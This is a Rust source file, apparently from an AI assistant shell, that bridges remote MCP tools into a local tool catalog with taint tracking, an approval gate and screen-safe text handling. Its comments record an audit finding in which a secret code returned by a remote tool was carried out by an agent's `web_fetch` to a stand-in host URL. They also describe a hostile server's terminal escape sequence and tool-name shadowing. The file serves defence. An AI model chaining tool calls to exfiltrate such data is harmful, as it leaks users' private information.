//! The MCP bridge: presents a remote MCP tool as if it were a local `Tool`.
//!
//! THE SWIFT LESSON: over there `MCPTool` was written, compiled, passed its tests
//! and was NEVER INSTANTIATED — the mechanism was built and nobody wired it up. So
//! as not to repeat that mistake, the WIRING functions live here next to the
//! bridge (`feed_catalog`, `bind_executor`) and both are genuinely tested: not "I
//! built it" but "it appears in the catalog and it triggers the approval gate".
//!
//! ## This file DOES NOT GO ON THE NETWORK
//!
//! The socket is in `tacet-mcp`. What happens here is translation: a schema
//! converted into an `ArgSchema`, a response converted into a `ToolOutcome`, a
//! network error converted into a `ToolError`. The network monopoly is preserved
//! by that separation.
//!
//! ## The security model (spec §3.3, §5.4) — WHAT IS and IS NOT here
//!
//! The B-permission model has three defences:
//!
//! - **(a) an MCP result is personal AND outside text:** `MCPTool::taints_session()`
//!   and `external_content()` both return `true` (audit H2-a). The first version
//!   said `false` — "an MCP tool is not a SOURCE of personal data but an EXIT for
//!   it" — and was measured wrong: a remote read returned "PIN reset code
//!   482913", the session stayed clean, and the next `web_fetch` carried the code
//!   to `https://x.test/?c=482913` with no question asked. A server the user
//!   connected is exactly where their mail, tickets and files live. A connection
//!   can be made STRICTER (`always_ask`), never looser.
//! - **(b) the approval gate on a tainted session:** in `ToolExecutor`. This file
//!   BINDS the tools' names into that gate's `external_tools` list
//!   (`bind_executor`). Unbound, the gate has no input — exactly the mistake of
//!   the first round.
//! - **(c) showing the real content at approval time:** `ToolExecutor` puts
//!   `call.args` verbatim into the approval request. There is no work for this
//!   file there, but we test that it is not broken.
//!
//! "Always allow" (spec §3.6) is DELIBERATELY ABSENT in v1: whatever the
//! `ApprovalGate` implementation says goes, and no path bypassing the gate was
//! opened here.
//!
//! ## Blocking
//!
//! `tacet-mcp` is a blocking client (the reasoning is there). The `run` body is
//! `async` but there is a waiting socket inside it; since there is no runtime in
//! this work tree and `tacet_engine::wait` drives futures on a single thread, the
//! behaviour is correct. The price must be stated openly: a 120-second MCP call
//! keeps that thread busy for that long.

use serde_json::Value;
use std::sync::Arc;
use tacet_kernel::{
    ArgSchema, Tool, ToolCatalog, ToolContext, ToolError, ToolOutcome, TraceUpdate, boxed,
};
use tacet_mcp::{
    Config, ConnectionSetting, MCPClient, MCPError, convert_schema, truncate_description,
};

/// The cap on raw output returned to the model (characters).
///
/// Output above this goes into the `DataStore`, and the model gets a summary + a
/// `source_ref` (§5.5, the 4096 bypass channel). The number was chosen to be about
/// 200 tokens: a file listing or a short command output should pass as is, a
/// ten-page build log should NOT.
pub const SHORT_OUTPUT_LIMIT: usize = 800;

/// The tail of long output handed to the model (lines).
///
/// WHY THE TAIL, NOT THE HEAD: in command/log style output the error lives AT THE
/// END. Showing the head would give the model the impression "everything is fine".
pub const TAIL_LINES: usize = 30;

// ---------------------------------------------------------------------------
// The bridge tool
// ---------------------------------------------------------------------------

/// The local tool representing a single remote MCP tool.
pub struct MCPTool {
    /// The name in the catalog. `<connection>_<remote_name>` — see
    /// `build_tool_name`.
    name: String,
    /// The real name on the server; `tools/call` wants this.
    remote_name: String,
    /// The user-friendly connection name shown at the head of the chip text. The
    /// user reads "this happened off the device" from the chip (§3.2).
    connection_name: String,
    description: String,
    schema: ArgSchema,
    client: Arc<MCPClient>,
    /// `remote_name` as a screen may show it (audit M14). The server chose the
    /// name, so it can carry an escape sequence; `remote_name` itself stays
    /// byte-exact because `tools/call` has to send it back as given.
    remote_label: String,
    /// The connection's `always_ask` (see `ConnectionSetting::always_ask`).
    always_ask: bool,
}

impl MCPTool {
    pub fn new(
        name: impl Into<String>,
        remote_name: impl Into<String>,
        connection_name: impl Into<String>,
        description: impl Into<String>,
        schema: ArgSchema,
        client: Arc<MCPClient>,
    ) -> Self {
        let remote_name = remote_name.into();
        Self {
            name: name.into(),
            remote_label: tacet_mcp::safe_for_screen(&remote_name),
            remote_name,
            connection_name: one_line(&connection_name.into()),
            description: one_line(&description.into()),
            schema,
            client,
            always_ask: false,
        }
    }

    /// The same tool, asking before every call — the connection's `always_ask`.
    pub fn asking_every_call(mut self, always_ask: bool) -> Self {
        self.always_ask = always_ask;
        self
    }

    pub fn remote_name(&self) -> &str {
        &self.remote_name
    }

    pub fn connection_name(&self) -> &str {
        &self.connection_name
    }
}

/// Text from a server — or from a config file a server's docs told the user to
/// paste — on its way to a screen, as ONE line with no control character
/// (audit M14).
///
/// NOT `safe_for_screen` EVERYWHERE, because that one also cuts at 120
/// characters, and some of these lines are ours and longer (the `chmod 600`
/// advice is ~250). Where the far side chose the text — a tool name, a type
/// string — the capped gate is applied to that piece first; this is the
/// uncapped pass over the whole line that every string leaving this module
/// gets.
fn one_line(raw: &str) -> String {
    raw.chars()
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect::<String>()
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

/// `one_line` for a body that is MEANT to have lines — a tool's output shown by
/// `tacet mcp try`. Newlines survive; every other control character (ESC, CR,
/// the 8-bit CSI) becomes a space.
fn screen_block(raw: &str) -> String {
    raw.chars()
        .map(|c| if c.is_control() && c != '\n' { ' ' } else { c })
        .collect()
}

/// Paints a running remote task onto the chip that started it:
/// `serverim · export · running · 12s`.
struct ChipWatch {
    reporter: Arc<dyn tacet_kernel::Reporter>,
    trace: tacet_kernel::TraceId,
    connection: String,
}

impl tacet_mcp::TaskWatch for ChipWatch {
    fn tick(&self, progress: &tacet_mcp::tasks::Progress) {
        self.reporter.update(
            self.trace,
            // The task id and status are the SERVER's words (audit M14).
            TraceUpdate::default().text(format!(
                "{} · {} · {} · {}s",
                self.connection,
                tacet_mcp::safe_for_screen(&progress.id),
                tacet_mcp::safe_for_screen(&progress.status),
                progress.elapsed.as_secs()
            )),
        );
    }
}

impl Tool for MCPTool {
    fn name(&self) -> &str {
        &self.name
    }

    fn description(&self) -> &str {
        &self.description
    }

    fn schema(&self) -> ArgSchema {
        self.schema.clone()
    }

    /// An MCP result TAINTS the session (audit H2-a).
    ///
    /// This said `false`, on the argument that an MCP tool "does not read data,
    /// it SENDS IT OUT", and that tainting would make every second MCP call ask.
    /// The second half is true and is the price; the first half was measured
    /// false: a remote read returned "PIN reset code 482913", the session stayed
    /// clean, and `web_fetch https://x.test/?c=482913` ran with no question. The
    /// servers a user connects are where their mail, tickets and files live —
    /// the same presumption `http` makes for a host the user named, and the two
    /// had disagreed for no reason anyone wrote down.
    ///
    /// NOT CONFIGURABLE. A connection can only be made stricter (`always_ask`).
    fn taints_session(&self) -> bool {
        true
    }

    /// And its text was written by somebody else (audit H2-c): after it, the
    /// tools that act on this machine ask before every call.
    fn external_content(&self) -> bool {
        true
    }

    /// The connection's `always_ask`.
    fn always_asks(&self) -> bool {
        self.always_ask
    }

    /// LONGER THAN THE DEFAULT, for two waits nobody here controls: a remote
    /// task polled after its call (`tacet_mcp::tasks::DEADLINE`, on top of the
    /// call's own `TIMEOUT_S`), and a server's question put to the user (MRTR),
    /// which waits as long as the person takes to answer. The transport's own
    /// timeouts end a dead server long before this; it only has to never cut off
    /// a person typing.
    fn deadline(&self) -> std::time::Duration {
        std::time::Duration::from_secs(30 * 60)
    }

    fn run<'a>(&'a self, args: Value, ctx: &'a mut ToolContext) -> ToolFuture<'a> {
        boxed(async move {
            let trace = ctx.start_chip(
                "connection",
                &format!("{} · running…", self.connection_name),
            );
            ctx.update_chip(
                trace,
                TraceUpdate::default()
                    // The first layer of transparency: the outgoing content stands
                    // in the chip. Even the "always allow" mode of §3.6 does not
                    // drop it.
                    .raw_input(serde_json::to_string_pretty(&args).unwrap_or_default()),
            );

            // A remote task can run for a minute or more (spec §6). The chip is
            // the only thing standing between that and "it froze", so the
            // watcher is built here, around THIS call's chip.
            let watch: Arc<dyn tacet_mcp::TaskWatch> = Arc::new(ChipWatch {
                reporter: Arc::clone(&ctx.reporter),
                trace,
                connection: self.connection_name.clone(),
            });
            let result = self.client.call_tool_watching(
                &self.remote_name,
                &args,
                &self.connection_name,
                watch,
            );

            match result {
                Err(error) => {
                    // The two channels: a Turkish sentence to the chip, FIXED
                    // English text to the model. The translation goes through the
                    // single exit point of `ToolOutcome::failed`; raw `ureq`/server
                    // text DOES NOT LEAK from here.
                    let converted = convert_error(&error);
                    let chip = format!(
                        "{} · {}",
                        self.connection_name,
                        one_line(&error.short_error())
                    );
                    ctx.update_chip(
                        trace,
                        TraceUpdate::state(tacet_kernel::ToolState::Failed(chip.clone()))
                            .text(chip.clone()),
                    );
                    let mut o = ToolOutcome::failed(&converted);
                    o.chip_text = chip;
                    o
                }
                Ok((text, server_error)) => {
                    let outcome = self.process_output(ctx, text, server_error);
                    ctx.update_chip(
                        trace,
                        TraceUpdate::state(outcome.state.clone())
                            .text(outcome.chip_text.clone())
                            .raw_output(outcome.raw_output.clone().unwrap_or_default()),
                    );
                    outcome
                }
            }
        })
    }
}

impl MCPTool {
    /// §5.5 — MCP output NEVER enters the context in its raw form.
    fn process_output(&self, ctx: &ToolContext, text: String, server_error: bool) -> ToolOutcome {
        let label = if server_error { "failed" } else { "ok" };
        let chip = format!("{} · {} {}", self.connection_name, self.remote_label, label);

        if text.trim().is_empty() {
            // Empty output DOES NOT mean "nothing happened" (a command may have
            // succeeded silently); we say that to the model explicitly, otherwise it
            // will try to repeat the tool call.
            return ToolOutcome::read_ok(chip, "tool returned no output").raw_output(text);
        }

        // Short output passes as is: using the bypass channel needlessly costs the
        // model another turn, and in a small model that turn is wasted.
        if text.chars().count() <= SHORT_OUTPUT_LIMIT {
            let to_model = if server_error {
                // THE SERVER'S tool error is not a malfunction but the tool's
                // result; the model must be able to read it and explain it to the
                // user. That is why `ERROR_MODEL_TEXT` IS NOT USED.
                format!("tool_error: {text}")
            } else {
                text.clone()
            };
            return ToolOutcome::read_ok(chip, to_model).raw_output(text);
        }

        // Long output: all of it to the store, the last lines + a source_ref to the
        // model.
        let lines: Vec<&str> = text.lines().collect();
        let tail = lines[lines.len().saturating_sub(TAIL_LINES)..].join("\n");
        let summary = format!(
            "{} lines of output; last {} lines:\n{}",
            lines.len(),
            lines.len().min(TAIL_LINES),
            truncate(&tail, SHORT_OUTPUT_LIMIT),
        );
        let source_ref = ctx.store(
            "mcp",
            &format!("{} lines of output", lines.len()),
            text.clone(),
        );
        ToolOutcome::summarize(chip, summary, source_ref.as_str()).raw_output(text)
    }
}

/// Truncates long text at a character limit (respecting UTF-8 boundaries).
fn truncate(text: &str, limit: usize) -> String {
    if text.chars().count() <= limit {
        return text.to_string();
    }
    text.chars().take(limit).collect::<String>() + "…"
}

/// `MCPError` -> `ToolError`.
///
/// The text going to the model will be `ERROR_MODEL_TEXT` in any case (a core
/// decision); the distinction only determines the sentence the USER sees.
fn convert_error(error: &MCPError) -> ToolError {
    match error {
        MCPError::Timeout => ToolError::Timeout,
        other => ToolError::Other(other.short_error()),
    }
}

// ---------------------------------------------------------------------------
// Name generation
// ---------------------------------------------------------------------------

/// The catalog name: `<connection>_<remote_name>`, ASCII snake_case.
///
/// WHY A PREFIX: two servers may both offer a tool called `run`. Without a prefix
/// the second shadows the first and the model cannot know which server it went to;
/// on top of that the approval gate's denial cache uses the tool name as the
/// `source`, so a denial given to one server would silence the other too.
///
/// WHY SIMPLIFICATION: the model has to produce the name verbatim in the grammar
/// and `ToolCall::parse` accepts only `[A-Za-z0-9_]`. A connection name with spaces
/// such as "home server" would produce an uncallable tool.
pub fn build_tool_name(connection_name: &str, remote_name: &str) -> String {
    format!(
        "{}_{}",
        simplify_name(connection_name),
        simplify_name(remote_name)
    )
}

fn simplify_name(raw: &str) -> String {
    let mut output = String::new();
    let mut underscore_pending = false;
    for c in raw.chars() {
        if c.is_ascii_alphanumeric() {
            if underscore_pending && !output.is_empty() {
                output.push('_');
            }
            underscore_pending = false;
            output.extend(c.to_lowercase());
        } else {
            // Everything non-ASCII, Turkish letters and spaces included, counts as
            // a separator; consecutive separators collapse into a single
            // underscore.
            underscore_pending = true;
        }
    }
    output
}

// ---------------------------------------------------------------------------
// Loading
// ---------------------------------------------------------------------------

/// A tool that could not be imported — NOT SWALLOWED SILENTLY.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SkippedTool {
    pub connection: String,
    pub remote_name: String,
    pub reason: String,
}

/// The load outcome of one connection.
#[derive(Default)]
pub struct LoadOutcome {
    pub tools: Vec<Arc<dyn Tool>>,
    pub skipped: Vec<SkippedTool>,
    /// If the connection could not be established, why (shown to the user).
    pub connection_errors: Vec<(String, String)>,
    /// Constraints dropped during conversion: "tool: field: `pattern` not
    /// enforced".
    pub notes: Vec<String>,
}

impl LoadOutcome {
    /// The names that will appear in the catalog. This is exactly the input of
    /// `ToolExecutor::external_tool`.
    pub fn names(&self) -> Vec<String> {
        self.tools.iter().map(|t| t.name().to_string()).collect()
    }

    /// Every string in the outcome as ONE screen-safe line (audit M14).
    ///
    /// THE LAST STEP OF EVERY PATH THAT BUILDS ONE, rather than a promise each
    /// `push` keeps: the shell prints these on every start (`report_mcp`) with a
    /// plain `eprintln!`, and one forgotten `format!` with a server's word in it
    /// was the whole of the finding — `note='y\u{1b}[31mRED…'` reached the tty.
    fn screen_safe(mut self) -> Self {
        for note in &mut self.notes {
            *note = one_line(note);
        }
        for skipped in &mut self.skipped {
            skipped.connection = one_line(&skipped.connection);
            skipped.remote_name = one_line(&skipped.remote_name);
            skipped.reason = one_line(&skipped.reason);
        }
        for (name, error) in &mut self.connection_errors {
            *name = one_line(name);
            *error = one_line(error);
        }
        self
    }

    fn merge(&mut self, other: LoadOutcome) {
        self.tools.extend(other.tools);
        self.skipped.extend(other.skipped);
        self.connection_errors.extend(other.connection_errors);
        self.notes.extend(other.notes);
    }
}

/// A single connection: `initialize` + `tools/list` + the schema bridge.
/// **GOES ON THE NETWORK.**
pub fn load_connection(setting: &ConnectionSetting) -> LoadOutcome {
    load_connection_with(setting, Arc::new(tacet_mcp::DeclineInput))
}

/// `load_connection`, with somebody to answer the server's questions (MRTR,
/// spec §4). Headless callers pass `DeclineInput` and get today's behaviour:
/// a server that asks for input gets a declined call.
pub fn load_connection_with(
    setting: &ConnectionSetting,
    asker: Arc<dyn tacet_mcp::InputAsk>,
) -> LoadOutcome {
    load_connection_through(setting, asker, None)
}

/// `load_connection_with` over a transport the caller supplies — the
/// record/replay one in tests (`tacet_mcp::transport::replay`). The same seam
/// `MCPClient::with_transport` is; it exists so the strings a HOSTILE server
/// can put into a `LoadOutcome` are measured on the path the shell takes, not
/// on a copy of it.
pub fn load_connection_over(
    setting: &ConnectionSetting,
    asker: Arc<dyn tacet_mcp::InputAsk>,
    transport: Arc<dyn tacet_mcp::Transport>,
) -> LoadOutcome {
    load_connection_through(setting, asker, Some(transport))
}

fn load_connection_through(
    setting: &ConnectionSetting,
    asker: Arc<dyn tacet_mcp::InputAsk>,
    transport: Option<Arc<dyn tacet_mcp::Transport>>,
) -> LoadOutcome {
    let mut outcome = LoadOutcome::default();

    // An unrecognised `spec` is NOT guessed at silently: the connection still
    // loads (as `auto`, the safe reading) and the user is told which word was
    // not understood.
    if !setting.spec_is_understood() {
        outcome.notes.push(format!(
            "{}: the spec value {:?} was not recognised — using auto (2026-07-28, then legacy)",
            setting.name,
            setting.spec.clone().unwrap_or_default()
        ));
    }

    // THE TOKEN WINS OVER THE STATIC KEY. A connection configured for OAuth
    // that still carries a `key` is a leftover, and the leftover is the one
    // more likely to be stale.
    let (client, auth_note) = match open_client(setting, asker, transport) {
        Ok(opened) => opened,
        Err(e) => {
            outcome
                .connection_errors
                .push((setting.name.clone(), e.short_error()));
            return outcome.screen_safe();
        }
    };
    if let Some(note) = auth_note {
        outcome.notes.push(format!("{}: {note}", setting.name));
    }
    let client = Arc::new(client);

    let specs = match client.tools() {
        Ok(s) => s,
        Err(e) => {
            outcome
                .connection_errors
                .push((setting.name.clone(), e.short_error()));
            return outcome.screen_safe();
        }
    };

    // The chip and the notes never guess which revision was spoken; they read
    // it off the client, which knows because it is the one that spoke.
    if client.fell_back() {
        outcome.notes.push(format!(
            "{}: legacy protocol (the server did not accept {})",
            setting.name,
            tacet_mcp::PROTOCOL_VERSION
        ));
    }

    for spec in specs {
        match convert_schema(&spec.schema) {
            Ok(conversion) => {
                for note in &conversion.notes.0 {
                    // Both halves are the server's: its tool name, and the
                    // schema text the note quotes (audit M14).
                    outcome.notes.push(format!(
                        "{}: {}",
                        tacet_mcp::safe_for_screen(&spec.name),
                        tacet_mcp::safe_for_screen(note)
                    ));
                }
                outcome.tools.push(Arc::new(
                    MCPTool::new(
                        build_tool_name(&setting.name, &spec.name),
                        spec.name.clone(),
                        setting.name.clone(),
                        truncate_description(&spec.description),
                        conversion.schema,
                        Arc::clone(&client),
                    )
                    .asking_every_call(setting.always_ask),
                ) as Arc<dyn Tool>);
            }
            // SILENTLY ACCEPTING SOMETHING UNCONVERTIBLE IS FORBIDDEN: a wrongly
            // narrowed schema means the grammar forces the model into a shape the
            // server will reject, and nobody can see it. The tool is skipped and the
            // reason is recorded.
            Err(reason) => outcome.skipped.push(SkippedTool {
                connection: setting.name.clone(),
                remote_name: tacet_mcp::safe_for_screen(&spec.name),
                // `unsupported type: <whatever the server wrote>` — capped and
                // stripped like any other text the far side chose.
                reason: tacet_mcp::safe_for_screen(&reason.short()),
            }),
        }
    }

    outcome.screen_safe()
}

/// The client a connection talks through, with the credential the CHAT path
/// uses — the OAuth token when the connection has an `auth` block (audit L10).
///
/// ONE FUNCTION FOR BOTH CALLERS ON PURPOSE. `tacet mcp try` built its own
/// client with `setting.resolved_key()`, the static key, so on a connection
/// that logs in it went out with no token or a stale one and reported a
/// failure the shell itself would never have hit. A diagnostic that takes a
/// different path from the thing it diagnoses measures the wrong thing.
fn open_client(
    setting: &ConnectionSetting,
    asker: Arc<dyn tacet_mcp::InputAsk>,
    transport: Option<Arc<dyn tacet_mcp::Transport>>,
) -> Result<(MCPClient, Option<String>), MCPError> {
    let (key, auth_note) = resolve_key(setting);
    let mut client = MCPClient::new(setting.url.clone(), key)?
        .with_spec(setting.spec_choice())
        .with_asker(asker);
    if let Some(transport) = transport {
        client = client.with_transport(transport);
    }
    Ok((client, auth_note))
}

// ---------------------------------------------------------------------------
// M3 — logging in, from the shell's point of view
// ---------------------------------------------------------------------------

/// What the user must do by hand, because nothing here opens a browser or
/// listens on a socket.
pub struct LoginStep {
    /// The URL to open. Printed, never launched.
    pub url: String,
    /// Carried back into `finish_login`; holds the CSRF state and the PKCE
    /// verifier, neither of which ever leaves this machine.
    pub started: tacet_mcp::auth::Authorization,
    setting: tacet_mcp::AuthSetting,
    connection: String,
}

/// Starts the authorization-code flow for a connection. NO NETWORK YET — this
/// only builds a URL.
pub fn begin_login(name: &str) -> Result<LoginStep, String> {
    let (config, _exposed) =
        tacet_mcp::config::read_default_checked().map_err(|e| e.short_error())?;
    let setting = config
        .connections
        .iter()
        .find(|c| c.name.eq_ignore_ascii_case(name))
        .ok_or_else(|| format!("no connection named {name:?} in mcp.json"))?;
    let auth = setting.auth.clone().ok_or_else(|| {
        format!("{name:?} has no `auth` block in mcp.json — nothing to log in to")
    })?;
    // The connection's own URL is the RFC 8707 resource: the token is minted
    // for this server and no other (audit L1).
    let started = tacet_mcp::auth::begin(&auth, &setting.url).map_err(|e| e.short_error())?;
    Ok(LoginStep {
        url: started.url.clone(),
        started,
        setting: auth,
        connection: setting.name.clone(),
    })
}

/// Finishes it with the URL the user pasted back. **GOES ON THE NETWORK** —
/// but only after the state and the issuer have both checked out.
pub fn finish_login(step: &LoginStep, pasted: &str) -> Result<String, String> {
    let redirect = tacet_mcp::auth::parse_redirect(pasted.trim());
    let transport = tacet_mcp::HttpTransport::new();
    let token = tacet_mcp::auth::redeem(
        &transport,
        &step.setting,
        &step.started,
        &redirect,
        tacet_mcp::auth::now_seconds(),
    )
    .map_err(|e| e.short_error())?;

    let path =
        tacet_mcp::auth::token_path().ok_or("no config directory to write the token into")?;
    let mut store = tacet_mcp::auth::read_tokens(&path).map_err(|e| e.short_error())?;
    store.tokens.insert(step.connection.clone(), token);
    tacet_mcp::auth::write_tokens(&path, &store).map_err(|e| e.short_error())?;
    Ok(path.display().to_string())
}

/// Forgets a connection's token. Local only — the authorization server is not
/// told, because a client that quietly calls a revocation endpoint on your
/// behalf is doing something you did not ask for.
pub fn logout(name: &str) -> Result<bool, String> {
    let path = tacet_mcp::auth::token_path().ok_or("no config directory")?;
    let mut store = tacet_mcp::auth::read_tokens(&path).map_err(|e| e.short_error())?;
    let removed = store
        .tokens
        .keys()
        .find(|k| k.eq_ignore_ascii_case(name))
        .cloned();
    match removed {
        Some(key) => {
            store.tokens.remove(&key);
            tacet_mcp::auth::write_tokens(&path, &store).map_err(|e| e.short_error())?;
            Ok(true)
        }
        None => Ok(false),
    }
}

/// The credential a connection should travel with, and anything the user needs
/// to be told about it.
///
/// The token is only used if it is BOUND to the issuer this connection is
/// configured with (SEP-2352) and has not expired — both checks live in
/// `tacet_mcp::auth`, which is where the reasoning about credentials belongs.
fn resolve_key(setting: &ConnectionSetting) -> (Option<String>, Option<String>) {
    let Some(auth) = &setting.auth else {
        return (setting.resolved_key(), None);
    };
    let Some(path) = tacet_mcp::auth::token_path() else {
        return (None, Some("no config directory, so no stored token".into()));
    };
    let store = match tacet_mcp::auth::read_tokens(&path) {
        Ok(store) => store,
        Err(e) => return (None, Some(e.short_error())),
    };
    match store.usable(&setting.name, &auth.issuer, tacet_mcp::auth::now_seconds()) {
        Some(token) => (Some(token.access_token.clone()), None),
        None => (
            None,
            Some(format!(
                "not logged in (or the token expired) — run `tacet mcp login {}`",
                setting.name
            )),
        ),
    }
}

/// Every valid connection in the configuration. **GOES ON THE NETWORK.**
///
/// With no connections it returns an empty outcome — NOT AN ERROR (§2.1 "off by
/// default").
pub fn load_from_config(config: &Config) -> LoadOutcome {
    load_from_config_with(config, Arc::new(tacet_mcp::DeclineInput))
}

pub fn load_from_config_with(config: &Config, asker: Arc<dyn tacet_mcp::InputAsk>) -> LoadOutcome {
    let mut total = LoadOutcome::default();
    for setting in config.valid() {
        total.merge(load_connection_with(setting, Arc::clone(&asker)));
    }
    total
}

// ---------------------------------------------------------------------------
// The shell's window onto the connections
// ---------------------------------------------------------------------------

/// The MRTR types the shell needs to implement its own asker. RE-EXPORTED HERE
/// rather than reached for directly: `tacet-mcp` is not in the shell's
/// production graph, and "MCP is reached through this module" is the invariant
/// that keeps it that way.
pub use tacet_mcp::{InputAsk, Question, QuestionKind};

/// One line of `tacet mcp list`. Plain data — the shell decides how to paint
/// it, this module decides what is true.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ConnectionSummary {
    pub name: String,
    pub url: String,
    pub enabled: bool,
    /// What the file says, as written; `auto` when it says nothing.
    pub spec: String,
    /// Was that value recognised. `false` means the connection still works (as
    /// `auto`) but the word in the file is not one we know.
    pub spec_understood: bool,
}

/// The configured connections. READS THE FILE ONLY — no socket is opened.
pub fn connections() -> Result<Vec<ConnectionSummary>, String> {
    let (config, _exposed) =
        tacet_mcp::config::read_default_checked().map_err(|e| e.short_error())?;
    Ok(config
        .connections
        .iter()
        .map(|c| ConnectionSummary {
            name: c.name.clone(),
            url: c.url.clone(),
            enabled: c.enabled,
            spec: c.spec.clone().unwrap_or_else(|| "auto".into()),
            spec_understood: c.spec_is_understood(),
        })
        .collect())
}

/// What one live attempt learned. Three numbers and a list, no adjectives.
#[derive(Debug, Clone)]
pub struct TryOutcome {
    /// The revision actually spoken.
    pub revision: String,
    /// Did `auto` have to fall back to the frozen path.
    pub fell_back: bool,
    pub millis: u128,
    /// Name and already-truncated description, in catalog order.
    pub tools: Vec<(String, String)>,
    /// The tool that was called, its output, and whether the SERVER called it
    /// an error. `None` when no call was asked for.
    pub called: Option<(String, String, bool)>,
}

/// Talks to ONE connection: discovery, the catalog, the round-trip time.
/// **GOES ON THE NETWORK** — it is only ever called because somebody typed it.
pub fn try_connection(
    name: &str,
    asker: Arc<dyn InputAsk>,
    call: Option<(String, Value)>,
) -> Result<TryOutcome, String> {
    try_connection_through(name, asker, call, None)
}

/// `try_connection` over a transport the caller supplies — the replay one in
/// tests. Everything else is the real path: the config file, the token file,
/// the client the shell would build.
pub fn try_connection_over(
    name: &str,
    asker: Arc<dyn InputAsk>,
    call: Option<(String, Value)>,
    transport: Arc<dyn tacet_mcp::Transport>,
) -> Result<TryOutcome, String> {
    try_connection_through(name, asker, call, Some(transport))
}

fn try_connection_through(
    name: &str,
    asker: Arc<dyn InputAsk>,
    call: Option<(String, Value)>,
    transport: Option<Arc<dyn tacet_mcp::Transport>>,
) -> Result<TryOutcome, String> {
    let (config, _exposed) =
        tacet_mcp::config::read_default_checked().map_err(|e| one_line(&e.short_error()))?;
    let setting = config
        .connections
        .iter()
        .find(|c| c.name.eq_ignore_ascii_case(name))
        .ok_or_else(|| format!("no connection named {name:?} in mcp.json"))?;

    // THE CHAT PATH'S CLIENT, token and all (audit L10). When the login is
    // missing or expired the attempt still goes out — the server's own answer
    // is part of what `try` reports — and the reason travels with any failure.
    let (client, auth_note) =
        open_client(setting, asker, transport).map_err(|e| one_line(&e.short_error()))?;
    let explain = |error: String| match &auth_note {
        Some(note) => one_line(&format!("{error} ({note})")),
        None => one_line(&error),
    };

    let started = std::time::Instant::now();
    let specs = client.tools().map_err(|e| explain(e.short_error()))?;
    let millis = started.elapsed().as_millis();

    // ONE CALL, AND ONLY THE ONE THAT WAS NAMED. The draft spec asks this
    // command to make "one no-effect call if the server offers one" — but
    // whether a tool has effects cannot be read off its description, and
    // guessing wrong means running something on somebody's server to satisfy a
    // smoke test. The user names the tool or no call is made.
    let called = match call {
        None => None,
        Some((tool, arguments)) => Some(
            client
                .call_tool_as(&tool, &arguments, name)
                // The output is the server's text, printed by the shell as it
                // comes (audit M14): lines survive, escapes do not.
                .map(|(text, is_error)| (one_line(&tool), screen_block(&text), is_error))
                .map_err(|e| explain(format!("{tool}: {}", e.short_error())))?,
        ),
    };

    Ok(TryOutcome {
        called,
        revision: client
            .revision()
            .map(tacet_mcp::Revision::label)
            .unwrap_or("unknown")
            .to_string(),
        fell_back: client.fell_back(),
        millis,
        tools: specs
            .into_iter()
            .map(|s| {
                (
                    tacet_mcp::safe_for_screen(&s.name),
                    one_line(&truncate_description(&s.description)),
                )
            })
            .collect(),
    })
}

/// Loads from `mcp.json` in the configuration directory (the path is decided by
/// `tacet_kernel::env`, not by `tacet_mcp`). If the file is missing it stays quietly
/// empty. **GOES ON THE NETWORK.**
pub fn load_from_default() -> LoadOutcome {
    load_from_default_with(Arc::new(tacet_mcp::DeclineInput))
}

/// `load_from_default`, with somebody to answer a server's questions.
pub fn load_from_default_with(asker: Arc<dyn tacet_mcp::InputAsk>) -> LoadOutcome {
    let mut outcome = LoadOutcome::default();
    // `read_default_checked`, NOT `read_default`: the permission measurement has
    // to sit on the path the shell actually takes. The note is pushed BEFORE the
    // connections are loaded so the warning is on screen even when every
    // connection then fails — a token readable by other local accounts is a
    // finding regardless of whether the server answered.
    match tacet_mcp::config::read_default_checked() {
        Ok((c, exposed)) => {
            if exposed {
                let where_it_is = tacet_mcp::config::default_path()
                    .map(|p| p.display().to_string())
                    .unwrap_or_else(|| "mcp.json".to_string());
                // The remedy is spelled out: a warning a user cannot act on is
                // noise, and noise teaches people to skip warnings.
                outcome.notes.push(format!(
                    "{where_it_is} holds a plain-text key and is readable by other accounts on \
                     this machine — run `chmod 600 {where_it_is}`, or move the key into the \
                     environment with `key_env`"
                ));
            }
            outcome.merge(load_from_config_with(&c, asker));
        }
        Err(e) => outcome
            .connection_errors
            .push(("configuration".into(), e.short_error())),
    }
    outcome.screen_safe()
}

/// Adds the loaded tools to the catalog and returns their names.
///
/// The returned names must be given to `bind_executor` — OTHERWISE the approval
/// gate has no input and the Swift mistake at the head of this file repeats.
#[must_use = "the returned names must be bound into ToolExecutor's external_tools list"]
pub fn feed_catalog(catalog: &mut ToolCatalog, outcome: &mut LoadOutcome) -> Vec<String> {
    let mut added = Vec::new();
    let mut shadowed = Vec::new();
    for tool in &outcome.tools {
        // A NAME CLASH IS A SILENT SWAP, so it is refused and said out loud.
        //
        // `ToolCatalog::add` is a `Vec::push` and `find` returns the first
        // match, and built-ins are added before MCP tools in every production
        // path. So a connection called `web` offering `search` becomes
        // `web_search`, which resolves forever to the built-in: the remote tool
        // is uncallable, and when the two schemas happen to be compatible the
        // model's arguments for the server run against the built-in instead.
        // Neither outcome reports anything.
        //
        // The existing guard `tool_names_are_unique_case_insensitively` runs
        // over built-ins only and cannot see a name that arrives at runtime.
        if catalog.find(tool.name()).is_some() {
            shadowed.push(tool.name().to_string());
            continue;
        }
        catalog.add(Arc::clone(tool));
        added.push(tool.name().to_string());
    }
    for name in shadowed {
        outcome.skipped.push(SkippedTool {
            connection: name
                .split_once('_')
                .map(|(c, _)| c.to_string())
                .unwrap_or_default(),
            remote_name: name.clone(),
            reason: format!(
                "the name '{name}' is already taken by another tool, so the model could not                  have reached this one — rename the connection in the config"
            ),
        });
    }
    added
}

/// Binds the MCP tools into the approval gate's `external_tools` list.
///
/// Since `ToolExecutor::external_tool` is a builder that consumes `self`, the loop
/// has to be written outside; it lives here once so the same loop is not repeated
/// at every call site.
pub fn bind_executor(
    mut executor: crate::executor::ToolExecutor,
    names: &[String],
) -> crate::executor::ToolExecutor {
    for name in names {
        executor = executor.external_tool(name.clone());
    }
    executor
}

use tacet_kernel::ToolFuture;

#[cfg(test)]
mod tests {
    use super::*;
    use crate::executor::{
        AlwaysApprove, DENIAL_MODEL_TEXT, ExecutionReason, SilentDeny, ToolCall, ToolExecutor,
    };
    use serde_json::json;
    use tacet_engine::wait;
    use tacet_kernel::{
        ERROR_MODEL_TEXT, Field, InMemoryDataStore, SilentReporter, ToolState, boxed,
    };

